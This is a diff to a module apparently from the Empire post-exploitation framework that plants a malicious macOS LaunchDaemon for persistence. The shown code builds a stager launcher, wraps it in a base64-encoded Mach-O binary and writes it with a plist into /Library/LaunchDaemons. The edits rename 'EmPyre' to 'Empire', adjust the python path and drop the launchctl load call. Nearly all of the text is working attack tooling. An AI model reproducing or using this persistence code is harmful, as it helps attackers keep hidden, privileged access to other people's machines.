@@ -12,7 +12,7 @@ class Module:
             'Author': ['@xorrior'],
 
             # more verbose multi-line description of the module
-            'Description': ('Installs an EmPyre launchDaemon.'),
+            'Description': ('Installs an Empire launchDaemon.'),
 
             # True if the module needs to run in the background
             'Background' : False,
@@ -67,7 +67,7 @@ class Module:
                 'Value'         :   'com.proxy.initialize'
             },
             'DaemonLocation' : {
-                'Description'   :   'The full path of where the EmPyre launch daemon should be located.',
+                'Description'   :   'The full path of where the Empire launch daemon should be located.',
                 'Required'      :   True,
                 'Value'         :   ''
             }
@@ -97,7 +97,7 @@ class Module:
         userAgent = self.options['UserAgent']['Value']
         safeChecks = self.options['SafeChecks']['Value']
         launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='python', userAgent=userAgent, safeChecks=safeChecks)
-        launcher = launcher.strip('echo').strip(' | python &').strip("\"")
+        launcher = launcher.strip('echo').strip(' | /usr/bin/python &').strip("\"")
         machoBytes = self.mainMenu.stagers.generate_macho(launcherCode=launcher)
         encBytes = base64.b64encode(machoBytes)
 
@@ -159,12 +159,9 @@ process.communicate()
 process = subprocess.Popen('mv /tmp/%s /Library/LaunchDaemons/%s', stdout=subprocess.PIPE, shell=True)
 process.communicate()
 
-process = subprocess.Popen('launchctl load /Library/LaunchDaemons/%s', stdout=subprocess.PIPE, shell=True)
-process.communicate()
-
 print "\\n[+] Persistence has been installed: /Library/LaunchDaemons/%s"
-print "\\n[+] EmPyre daemon has been written to %s"
+print "\\n[+] Empire daemon has been written to %s"
 
-""" % (encBytes,plistSettings, programname, plistfilename, plistfilename, plistfilename, plistfilename, plistfilename, plistfilename, plistfilename, plistfilename, programname)
+""" % (encBytes,plistSettings, programname, plistfilename, plistfilename, plistfilename, plistfilename, plistfilename, plistfilename, plistfilename, programname)
 
         return script
